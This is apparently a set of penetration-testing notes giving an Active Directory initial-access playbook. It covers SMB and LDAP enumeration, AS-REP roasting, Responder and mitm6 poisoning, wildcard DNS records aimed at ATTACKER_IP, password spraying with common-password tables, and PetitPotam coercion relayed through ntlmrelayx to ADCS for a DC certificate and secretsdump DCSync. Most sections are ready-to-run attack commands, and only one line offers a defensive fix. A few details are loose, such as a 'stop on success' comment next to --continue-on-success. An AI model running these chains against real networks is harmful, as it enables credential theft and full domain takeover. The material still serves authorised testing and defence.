+++
title = 'Initial Access (Active Directory)'
date = 2026-10-30
type = 'notes'
weight = 10
toc = true
tags = ['active-directory', 'initial-access', 'enumeration']
+++

After gaining access to the network segment where the AD environment resides — often through pivoting from a previously compromised host — the goal is to **find the Domain Controller**, enumerate the domain without credentials if possible, and convert unauthenticated reconnaissance into a valid credential or session. The techniques below are ordered roughly by **noise level and prerequisite**: unauthenticated enumeration first, then poisoning and relay, then credential-based spraying, then modern coercion/relay chains that bypass SMB signing entirely.

> **2026 context that shapes this entire page:** NTLM relay is *not* a legacy concern. Microsoft's NTLM deprecation Phase 3 (October 2026) blocks **NTLMv1** SSO by default, but **NTLMv2 — the version used in relay — remains permitted indefinitely**. The classic **Coercion → NTLM Relay → ADCS ESC8 → Domain Admin** chain still works against the majority of environments running Server 2019/2022. New coercion primitives continue to emerge from unexpected surfaces (Snipping Tool, file pickers, Office handlers), and **CVE-2025-33073** resurrected NTLM reflection on any domain-joined host without SMB signing.

---

## 1. Finding Hosts and the Domain Controller

```bash
# Linux ping sweep
fping -asgq 172.16.5.0/23

# Nmap — discover DCs via LDAP/Kerberos SRV records
nmap -p 88,389,445,636 --script "ldap* and not brute" 172.16.5.0/24

# NetExec — sweep SMB and generate a hosts file
netexec smb 172.16.5.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

The DC is identifiable by **port 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB), 3268 (Global Catalog)**, and often by its hostname pattern (`DC01`, `DC02`). Once identified, add it to `/etc/hosts` and proceed.

---

## 2. SMB NULL, Guest, and Common Credentials

| Technique | Command |
|---|---|
| **Guest auth** | `enum4linux -a -u "guest" -p "" <DC-IP>` |
| **Guest auth** | `smbmap -u "guest" -p "" -P 445 -H <DC-IP>` |
| **Guest auth** | `smbclient -U '%' -L //<DC-IP>` |
| **NULL session** | `smbclient -N -L //<FQDN/IP>` |
| **NULL session** | `netexec smb <FQDN/IP> --shares -u '' -p ''` |
| **NULL session** | `smbmap -u "" -p "" -P 445 -H <DC-IP>` |
| **NULL session** | `enum4linux -a -u "" -p "" <DC-IP>` |

### Common SMB credentials

Source: [HackTricks — Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#possible-credentials)

| Common username(s) | Common password |
|---|---|
| (blank) | (blank) |
| guest | (blank) |
| Administrator, admin | (blank), password, administrator, admin |
| arcserve | arcserve, backup |
| tivoli, tmersrvd | tivoli, tmersrvd, admin |
| backupexec, backup | backupexec, backup, arcada |
| test, lab, demo | password, test, lab, demo |

> **Null sessions are increasingly rare** on modern DCs (`RestrictAnonymous` is often set), but they still appear on member servers and legacy appliances. Do not skip the check — it is cheap.

---

## 3. LDAP Anonymous Bind and RootDSE

Before Kerberos or SMB enumeration, check whether the DC allows **anonymous LDAP bind**. This is a distinct path from NULL SMB sessions and is frequently overlooked.

```bash
# Anonymous bind and RootDSE extraction
ldapsearch -x -H ldap://<DC-IP> -s base -b "" "objectclass=*"

# What you get from RootDSE: domain naming context, forest level, DC hostname,
# supported controls, and whether anonymous bind is allowed
```

Tools such as **adpentest** automate this: they query DNS SRV records (`_ldap._tcp.dc._msdcs.<domain>`, `_kerberos._tcp.dc._msdcs.<domain>`) and perform an anonymous LDAP RootDSE bind to extract the domain and forest level. If anonymous bind returns data, you may be able to enumerate users, groups, and computers without any credential.

---

## 4. Active Directory User Enumeration

> **Before enumerating users, understand the naming convention.** Many targets use the patterns in the **statistically-likely-usernames** lists (`jsmith.txt`, `jsmith2.txt`) from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames).

### Kerbrute — the lowest-noise enumerator

Kerbrute abuses Kerberos pre-authentication error codes (`KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` vs `KRB5KDC_ERR_PREAUTH_REQUIRED`) to determine whether a username exists **without triggering a login failure or a lockout**.

```bash
kerbrute userenum -d DOMAIN.EXAMPLE --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

### Modern alternatives (2025–2026)

| Tool | What it adds |
|---|---|
| **CredWolf** | Validates **usernames and secrets** (passwords, NT hashes, Kerberos keys, ticket files) over **both NTLM and Kerberos**; Kerberos username enumeration is explicitly designed not to trigger lockouts |
| **Brutus** | Multi-protocol credential testing (SMB, LDAP, WinRM, RDP, and 20+ others); includes **Kerberos user enumeration** and account-existence-oracle enumeration |
| **WindapSearch** | LDAP-based user/group/computer enumeration without Kerberos |
| **NetExec (`nxc`)** | `nxc smb <DC> --users` and `nxc ldap <DC> --users` |

```bash
# WindapSearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# enum4linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# rpcclient
rpcclient -U "" -N 172.16.5.5
# then: enumdomusers

# NetExec
nxc smb 172.16.5.5 --users
```

### AS-REP Roasting — users with pre-auth disabled

An account with **`DONT_REQ_PREAUTH`** set returns an AS-REP encrypted with its password hash, which can be cracked offline **without any credential**. This is part of the unauthenticated attack surface.

```bash
# Without credentials — enumerate and roast in one step
impacket-GetNPUsers <domain>/ -dc-ip <DC-IP> -request -format hashcat -outputfile asrep.txt

# With a user list
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC-IP> -request -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

> **Rubeus equivalent:** `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt`.

---

## 5. LLMNR / NBT-NS / mDNS Poisoning

LLMNR and NBT-NS are fallback name-resolution protocols used when DNS fails. Any host on the segment can answer them, so a rogue responder can impersonate a service and capture the victim’s **NetNTLMv2** hash. Combined with a lack of SMB signing, this often leads to administrative access.

### Responder — capture mode

```bash
sudo responder -I eth0 -dwPv
```

Results are printed on screen and saved under `/usr/share/responder/logs/`. Files are named per protocol (`HTTP-NTLMv2-<CLIENT_IP>.txt`, `SMB-NTLMv2-<CLIENT_IP>.txt`) and use the format `USER::DOMAIN:challenge:response:blob`.

Crack the captured hash:

```bash
hashcat -m 5600 hashfile /usr/share/wordlists/rockyou.txt
```

### Responder — relay mode (the more valuable mode)

Capture is useful; **relay** is what produces domain compromise. Disable Responder’s own SMB and HTTP servers so `ntlmrelayx` handles the authentication, then run a relay listener in parallel:

```bash
# Responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -dwPv

# Separate terminal
impacket-ntlmrelayx.py -tf targets.txt -smb2support
```

### Finding relay targets (hosts without SMB signing)

```bash
# NetExec — build a relay target list
netexec smb 172.16.5.0/24 --gen-relay-list targets.txt

# Nmap — confirm signing is "enabled but not required"
nmap -p 445 --script smb2-security-mode 172.16.5.0/24
```

> **Domain controllers enforce SMB signing by default**; workstations and member servers generally do not. That gap is what makes member-server relay viable — and **CVE-2025-33073** removes the admin prerequisite that previously limited it.

### Responder-NG (2026 fork)

**Responder-NG** is a fork with reliability and platform-handling improvements, including best-effort Windows operation. It remains an LLMNR, NBT-NS, and mDNS poisoner with rogue authentication servers for HTTP, SMB, MSSQL, FTP, LDAP, Kerberos, DNS, and more.

```bash
sudo python3 Responder.py -I eth0 -v
```

### LLMNR/NBT-NS poisoning from Windows — Inveigh

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# or the compiled version
.\Inveigh.exe
```

---

## 6. mitm6 — IPv6/DHCPv6 DNS Takeover

Windows prioritizes IPv6, and by default it will accept a DHCPv6 server that hands it a DNS server. **mitm6** acts as a rogue DHCPv6 server, assigns the attacker as the victim’s DNS server, and then poisons name resolution — which feeds directly into NTLM relay.

```bash
# Terminal 1 — poison DHCPv6/DNS
sudo mitm6 -d domain.local

# Terminal 2 — relay whatever authentication arrives
impacket-ntlmrelayx.py -6 -t ldaps://DC-IP -wh attacker.domain.local -l loot
```

**Why it matters:** mitm6 does **not** rely on LLMNR or NBT-NS being enabled. It exploits the default IPv6 configuration, so it works even when those protocols are disabled. The modified **MITM6-Kerberos-CNAME-Abuse** fork adds CNAME poisoning support, extending the technique to Kerberos relay scenarios.

> **WebDAV coercion variant:** to trigger WebClient coercion instead of regular SMB, the listener must use a **WebDAV connection string** format: `\\SERVER_NETBIOS@PORT/PATH/TO/FILE`.

---

## 7. ADIDNS Poisoning — Any Authenticated User Can Register DNS

This is the **authenticated** counterpart to mitm6 and is frequently missed. By default, **Authenticated Users have `CreateChild` rights on the AD-integrated DNS zone**, so **any domain account** (user or computer) can register a new DNS record — including a **wildcard record** that redirects all non-existent hostnames to the attacker.

```bash
# Query the zone and check whether you can create records
# (PowerMad / Invoke-DNSUpdate, or directly via LDAP)
# A wildcard record captures any name that does not already exist
```

**Attack chain:**

1. Register a wildcard A record pointing at the attacker (`*.domain.local → ATTACKER_IP`).
2. Wait for AD to sync the LDAP change via DNS dynamic updates (~180 seconds).
3. Any host that resolves a non-existent name now reaches the attacker — enabling **credential interception or NTLM relay** with the same outcome as LLMNR/NBT-NS spoofing.

> **2026 relevance:** this is the DNS-registration primitive that **CVE-2025-33073** uses to trigger local NTLM authentication. The default permission (`Authenticated Users` can create DNS records) is why the vulnerability is exploitable with only **any domain user** credential.

**Defensive fix:** remove `Create all child objects` from `Authenticated Users` on sensitive zones.

---

## 8. Password Policy Enumeration

**Before spraying, enumerate the lockout policy.** A common default is **5 failed attempts → 30-minute lockout**. Exceeding it locks real users and alerts defenders.

### From Linux

```bash
# NetExec with valid credentials
netexec smb 172.16.5.5 -u validuser -p validpass --pass-pol

# RPCClient with NULL session
rpcclient -U "" -N 172.16.5.5
# then: querydominfo

# enum4linux
enum4linux -P 172.16.5.5

# enum4linux-ng with structured output
enum4linux-ng -P 172.16.5.5 -oA outputfile
```

### From Windows

```cmd
net accounts /domain
```

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

> **PSO caveat:** a **Password Settings Object** can override the domain policy for specific users or groups. If your spray targets a user covered by a stricter PSO, the domain lockout threshold is irrelevant — you will lock them out sooner. **SpearSpray** explicitly detects and handles PSOs.

---

## 9. Password Spraying

Spraying means trying **one password across many usernames** — the inverse of brute force, and the only approach that respects a lockout policy. In 2026, **seasonal patterns and company-specific templates still work across every engagement**.

### From Linux

```bash
# Kerbrute — lowest noise; Kerberos pre-auth, no lockout by default
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt 'Welcome1'

# NetExec — spray a single password, stop on success
netexec smb <DC-IP> -u valid_users.txt -p 'Password123' --continue-on-success

# Bash loop with rpcclient (legacy, noisier)
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

### From Windows

```powershell
# Invoke-CleverSpray (recommended — lockout-aware)
Import-Module .\Invoke-CleverSpray.ps1
Invoke-CleverSpray -Password "Password-To-Spray"

# DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### SpearSpray — the 2026 standard for AD spraying

**SpearSpray** combines LDAP user enumeration with **pattern-based password generation** and sprays over **Kerberos pre-authentication**, which produces fewer noisy login failures than SMB/NTLM/LDAP-bind attempts.

```bash
# Enumerate users and spray with a company-specific pattern
spearspray -d domain.local --dc-ip DC-IP -u user -p pass --pattern 'Company{season}{year}!'

# Key features:
#   - Lockout protection: filters users near the threshold (default buffer: 2)
#   - PSO detection
#   - Jitter and rate limiting
#   - Neo4j integration — marks compromised users as "owned" in BloodHound
#   - Kerberos pre-auth, not NTLM
```

> **Threshold management:** SpearSpray’s `-thr` / `--threshold` option leaves a configurable buffer before lockout, and it **automatically filters users who are already near the limit**. This is the difference between a spray that survives a week and one that locks out the CFO on the first attempt.

### Common AD passwords (2026 reality)

**Corporate environments have moved past `Password123`.** 2026 wordlists reflect minimum-length policies, seasonal patterns, and company names:

| Pattern | Examples |
|---|---|
| **Season + year** | `Spring2026!`, `Summer2025#`, `Winter24!` |
| **Company + season/year** | `AcmeSpring2026!`, `Corp2025#` |
| **Month + year** | `March2026!`, `October2025!` |
| **Classic defaults** (still present) | `Welcome1`, `Password123`, `Passw0rd`, `Hello123` |
| **System-set machine passwords** | Machine account password = **lowercase hostname** (`MS01$` → `ms01`) |

> **Default credentials for appliances and services** are a separate, larger list. A 2026 red-team knowledge base indexes **3,468 default passwords** across 800+ tools and services — worth checking against any non-Microsoft service you find during enumeration.

---

## 10. Coercion and Relay — The Modern Initial Access Chain

This is the section that turns unauthenticated network position into a **domain credential or SYSTEM session**. The chain is **coerce → relay**, and the 2025–2026 additions are what make it viable on hosts that enforce SMB signing.

### 10.1 Coercion primitives

| Method | Tool | Protocol |
|---|---|---|
| **PetitPotam** | `PetitPotam.py` | MS-EFSRPC |
| **PrinterBug / SpoolSample** | `SpoolSample.exe` / `printerbug.py` | MS-RPRN |
| **DFSCoerce** | `dfscoerce.py` | MS-DFSNM |
| **Coercer** | `Coercer.py` | Multi-protocol (EFSRPC, RPRN, DFSNM, and more) |
| **WebDAV coercion** | Listener with `\\SERVER_NETBIOS@PORT/PATH` | WebClient |

### 10.2 Relay targets by protocol

| Target | Requirement | Command |
|---|---|---|
| **SMB** | Signing not required | `ntlmrelayx.py -tf targets.txt` |
| **LDAP(S)** | Signing not enforced on DC | `ntlmrelayx.py -t ldaps://DC` |
| **MSSQL** | No EPA | `ntlmrelayx.py -t mssql://DB -q "QUERY"` |
| **ADCS (ESC8)** | `/certsrv/` accepts NTLM | `ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController` |
| **HTTP(S)** | NTLM auth accepted | `ntlmrelayx.py -t http://TARGET/endpoint` |

### 10.3 ADCS ESC8 — the highest-value relay target

Relay a **coerced DC machine account** to the CA’s **HTTP web enrollment endpoint**, obtain a certificate for `DC01$`, then use PKINIT to get a TGT and DCSync.

```bash
# 1. Relay listener targeting the CA's web enrollment
impacket-ntlmrelayx.py -t http://<CA-HOST>/certsrv/certfnsh.asp --adcs \
  --template DomainController -smb2support

# 2. Coerce the DC
python3 PetitPotam.py <attacker-IP> <DC-IP>
# or printerbug.py / dfscoerce.py / Coercer.py

# 3. ntlmrelayx prints a base64 PFX; save it and authenticate
certipy auth -pfx dc01.pfx -dc-ip <DC-IP>
# or: gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass '' '<domain>/DC01$' dc01.ccache
KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass <DC-FQDN>
```

**BloodHound models this as the `CoerceAndRelayNTLMToADCS` edge** — the target computer can be coerced to authenticate to an ADCS server, and the authentication relayed to an ESC8-vulnerable endpoint. This edge exists for **Authenticated Users**, which is why a single low-privileged credential is enough to start the chain.

> **Certighost (CVE-2026-54121):** a separate CA-level flaw that allows a low-privileged user to obtain a **DC certificate directly**, without coercion or relay. Patched July 2026 — check the CA build before attempting.

### 10.4 CVE-2025-33073 — NTLM Reflection on Any Host Without SMB Signing

This vulnerability **removes the admin prerequisite** that previously limited relay attacks. By abusing marshaled target information in DNS records, an attacker can trick the SMB client into triggering **local NTLM authentication** against itself, yielding **SYSTEM on any domain-joined machine without SMB signing enforced**.

| Property | Detail |
|---|---|
| **CVE** | CVE-2025-33073 |
| **Type** | NTLM reflection / privilege escalation |
| **Prerequisite** | Network access + **credentials for any domain user** |
| **Patch** | June 2025 Windows updates |
| **Impact** | SYSTEM on unpatched hosts; DC → DCSync if the DC lacks signing |

**Attack requirements:** registering a malicious DNS record in **AD DNS** (allowed for `Authenticated Users` by default) **or** performing DNS poisoning on the local segment. The server then impersonates the SYSTEM token, granting full compromise.

> **Why this matters even if the DC is patched:** the vulnerability works against **any domain-joined system without SMB signing** — member servers and workstations. Those hosts often have paths to domain compromise of their own, and they are the “one-hop” systems that the Tier model misses.

### 10.5 SMB → LDAPS cross-protocol relay (channel binding bypass)

Even with SMB signing enforced, research demonstrated a **cross-protocol relay from SMB to LDAPS**. The technique strips specific NTLMSSP flags — `Negotiate Always Sign`, `Negotiate Seal`, `Negotiate Sign` — while preserving the **Message Integrity Code**, bypassing multiple controls at once.

```bash
# LDAPS relay — works when channel binding is not enforced
impacket-ntlmrelayx.py -t ldaps://DC-IP --remove-mic --delegate-access
```

> **Condition:** LDAP relay requires **signing and channel binding to be unenforced** on the DC. If LDAP signing is enforced but channel binding is absent, relay to `ldaps://` still works — `ntlmrelayx` handles it automatically. **BloodHound edge:** `CoerceAndRelayNTLMToLDAPS`.

---

## 11. Beyond Credentials — What to Do with the First Valid Account

Once you have **any** valid domain credential (from spraying, relay, AS-REP cracking, or a captured hash), the initial-access phase is over — but the enumeration that follows is where BloodHound earns its place. **Over 70% of AD environments contain an exploitable path from any authenticated user to Domain Admin**, and the path is almost never obvious.

```bash
# BloodHound collection from Linux
bloodhound-python -u <user> -p '<password>' -d domain.local -c All --zip

# or with a hash
bloodhound-python -u <user> --hashes :<NTLM> -d domain.local -c All --zip
```

The key edges to look for include `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`, `AddMember`, `AllowedToDelegate`, `AllowedToAct`, `HasSession`, and the coercion/relay edges (`CoerceAndRelayNTLMToADCS`, `CoerceAndRelayNTLMToLDAPS`).

---

## 12. Field Notes and Pitfalls

- **NTLMv2 is still permitted.** Microsoft’s deprecation targets NTLMv1; the relay chains in Section 10 remain viable.
- **The DC enforces SMB signing; member servers usually do not.** That gap is the relay surface, and **CVE-2025-33073** makes it exploitable with any domain user credential.
- **ADIDNS is an authenticated primitive.** Any domain user can register a wildcard record by default — do not assume you need mitm6 on a modern segment.
- **Check the lockout policy *and* PSOs before spraying.** A PSO can be stricter than the domain policy; SpearSpray handles both.
- **AS-REP Roasting needs no credential.** Always run `GetNPUsers` against the user list — accounts with `DONT_REQ_PREAUTH` are common in older environments.
- **Anonymous LDAP bind is separate from NULL SMB.** Check both; RootDSE extraction can give you the forest level and DC hostname for free.
- **Responder capture is only half the attack.** Relay mode — with SMB/HTTP disabled in `Responder.conf` so `ntlmrelayx` owns the authentication — is what produces domain compromise.
- **`--continue-on-success` matters.** NetExec stops at the first successful credential by default; for spraying, you want every hit.
- **Machine account passwords default to the lowercase hostname.** `MS01$` → `ms01` — a 2026 lab walkthrough used exactly this to get a TGT for `MS01$`.
- **Do not spray `Password123` in 2026 corporate environments.** Seasonal patterns (`Spring2026!`), company-name templates, and minimum-length policies are the current baseline.

---

## Quick Reference — Tool → Phase → Command

| Phase | Tool | Command |
|---|---|---|
| **Host discovery** | `fping` / `netexec` | `fping -asgq 172.16.5.0/23` / `netexec smb <CIDR>` |
| **NULL/Guest SMB** | `enum4linux-ng` / `smbmap` | `enum4linux-ng -A <DC>` |
| **Anonymous LDAP** | `ldapsearch` | `ldapsearch -x -H ldap://<DC> -s base -b "" "objectclass=*"` |
| **User enumeration** | `kerbrute` | `kerbrute userenum -d <domain> --dc <DC> users.txt` |
| **AS-REP Roasting** | `GetNPUsers.py` | `GetNPUsers.py <domain>/ -dc-ip <DC> -request -outputfile asrep.txt` |
| **LLMNR/NBT-NS** | `Responder` | `sudo responder -I eth0 -dwPv` |
| **Relay** | `ntlmrelayx.py` | `ntlmrelayx.py -tf targets.txt -smb2support` |
| **Relay to ADCS** | `ntlmrelayx.py` | `ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController` |
| **IPv6 takeover** | `mitm6` | `sudo mitm6 -d domain.local` |
| **ADIDNS poisoning** | `Powermad` / LDAP | Register wildcard `*` record |
| **Password policy** | `netexec` | `netexec smb <DC> -u user -p pass --pass-pol` |
| **Spraying** | `SpearSpray` | `spearspray -d domain --dc-ip DC -u user -p pass --pattern '...'` |
| **BloodHound** | `bloodhound-python` | `bloodhound-python -u user -p pass -d domain -c All --zip` |

This page is the **unauthenticated → first credential** bridge; once you have that credential, the **Domain Trusts**, **ADCS Attacks**, and **Built-in Groups Abuse** notes take over.
